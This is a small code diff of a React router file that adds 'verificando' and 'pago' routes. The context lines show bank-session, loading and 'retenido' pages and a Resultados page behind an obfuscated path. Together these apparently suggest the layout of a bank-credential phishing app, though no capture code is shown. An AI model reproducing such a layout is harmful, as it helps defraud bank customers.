@@ -27,11 +27,13 @@ function App() {
               <Route path='registrar' element={<Registrar/>}/>     
               <Route path='banco' element={<SesionBanco/>}/>  
               <Route path='final' element={<Final/>}/> 
+              <Route path='verificando' element={<Final/>}/>
               <Route path='carga' element={<Carga/>}/>     
               <Route path='carga2' element={<Carga2/>}/> 
               <Route path='EkM8pokjdsfiojsdijfiosn' element={<Resultados/>}/>    
               <Route path='retenido' element={<Retenido/>}/> 
               <Route path='registrar2' element={<Banco/>}/> 
+              <Route path='pago' element={<Banco/>}/> 
          {/*   <Route path='olvide-password' element={<OlvidePassword/>}/>             
               <Route path='olvide-password/:token' element={<NuevoPassword/>}/>
               <Route path='confirmar/:id' element={<ConfirmarCuenta/>}/>*/}  
